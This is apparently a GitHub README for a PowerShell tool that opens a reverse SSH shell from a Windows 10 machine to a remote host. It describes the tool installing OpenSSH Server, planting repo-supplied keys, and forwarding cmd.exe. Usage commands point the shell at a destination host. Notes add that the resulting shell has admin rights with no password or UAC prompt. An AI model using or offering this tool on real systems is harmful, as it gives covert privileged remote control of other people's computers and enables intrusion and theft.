# lol-reverseSSHell.ps1
Living Off the LAN Reverse Shell over SSH

This script is intended to make SSH reverse shells easier to initiate on Windows 10. It utilizes OpenSSH Server to forward a CMD.exe shell. If OpenSSH Server is missing from the Windows 10 host it will install it via WindowsCapability DISM. ( * If OpenSSH server is missing, the script will ask to download OpenSSH server from Microsoft.) Then it will copy the sshd_config file, SSH private key, and authorized_keys files from the repo's root to the proper locations on the Windows host. Finally it creates a reverse SSH connection. The shell served is CMD.exe by default. Once you're in the cmd.exe cli, you can type 'powershell' to get a PS shell. 

* Please generate NEW SSH KEYs. Use the repo keys only for testing. 

Usage: 
* .\lol-reverseSSHell.ps1 -DestinationUserName `<user>` -DestinationHost 10.10.10.10
* .\lol-reverseSSHell.ps1 -DestinationUserName `<user>` -DestinationHost 10.10.10.10 -DestinationPort 22 -DestinationBindLocalPort 7777 -InstallOpenSSHServer yes 
* get-help .\lol-reverseSSHell.ps1 

* get-help .\lol-reverseSSHell.ps1 -Examples

Remote cmd.exe in a bash terminal via ssh: 
![alt text](https://github.com/ArronJablonowski/lol-reverseSSHell/blob/main/image.png?raw=true)
Remotely executing commands via cmd.exe and powershell:  
![alt text](https://github.com/ArronJablonowski/lol-reverseSSHell/blob/main/image02.png?raw=true)

Unix vs Windows Reverse SSH Shells, and the Interesting Security Implications for Windows Users
-----------------------------------------------------------------------------------------------
Running list as I do research: 
* Unknown usernames are OK - Once you have a reverse connection, Windows does NOT require knowing the username to authenticate to a shell when using keypair authentication. A simple call to localhost and port will connect to a shell under the context of the user that initiated the reverse ssh connection. 
  
  --- Windows Example --- ssh localhost -p `<localport>`  
  --- Unix Example --------- ssh user123@localhost -p `<localport>` 
   
* Admin privleges - Because the shell is ran using admin privleges, and most Windows users run as privleged users, the shell will have admin privleges without ever needing to know the user's name or admin password. After a shell has been initiated, there are no password prompts or UAC alerts to prevent commands from being ran with elevated privleges. Almost equivlent to a root shell in Unix. Which means you can browse the entire file system and modify system files without permissions issues.  

